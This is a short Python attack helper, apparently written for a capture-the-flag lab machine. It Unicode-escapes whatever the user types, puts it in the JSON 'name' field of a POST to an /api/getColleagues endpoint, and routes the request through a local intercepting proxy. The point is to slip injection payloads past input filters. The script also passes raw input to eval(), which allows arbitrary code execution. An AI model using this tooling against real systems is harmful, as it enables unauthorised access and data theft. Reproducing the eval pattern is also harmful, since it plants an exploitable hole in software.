#!/usr/bin/python

import readline
import requests

url = "http://10.10.10.179/api/getColleagues"
proxies = { "http": "127.0.0.1:8080" }

def unicode_crap(txt):
	out = ""
	for i in txt:
		out = out + '\\u00%s' % hex(ord(i))[2:]
	return out

while True:
	headers = {
		"Content-type": "application/json"
	}
	cmd = eval(input("> "))
	encoded_cmd = unicode_crap(cmd)
	payload = '{"name": "' + encoded_cmd + '"}'
	print(payload)
	r = requests.post(url, data=payload, headers=headers, proxies=proxies)
	print((r.text))
	print("------------------------------------------------------")

